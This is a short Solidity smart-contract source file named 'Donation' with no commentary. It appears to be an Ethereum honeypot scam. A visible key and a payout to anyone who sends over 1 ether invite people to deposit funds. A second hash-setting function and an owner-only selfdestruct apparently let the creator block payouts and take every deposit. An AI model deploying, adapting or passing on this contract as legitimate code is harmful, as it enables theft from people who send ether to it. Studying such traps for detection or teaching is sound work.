pragma solidity ^0.4.25;

contract Donation
{
    bytes32 keyHash;
    address owner;

    constructor() public {
        owner = msg.sender;
    }

    function withdraw(string key) public payable
    {
        require(msg.sender == tx.origin);
        if(keyHash == keccak256(abi.encodePacked(key))) {
            if(msg.value > 1 ether) {
                msg.sender.transfer(address(this).balance);
            }
        }
    }

    function setup(string key) public
    {
        if (keyHash == 0x0) {
            keyHash = keccak256(abi.encodePacked(key));
        }
    }

    function new_hash(bytes32 _keyHash) public
    {
        if (keyHash == 0x0) {
            keyHash = _keyHash;
        }
    }

    function empty() public
    {
        require(msg.sender == owner);
        selfdestruct(owner);
    }

    function get_owner() public view returns(address){
        return owner;
    }

    function () public payable {

    }
}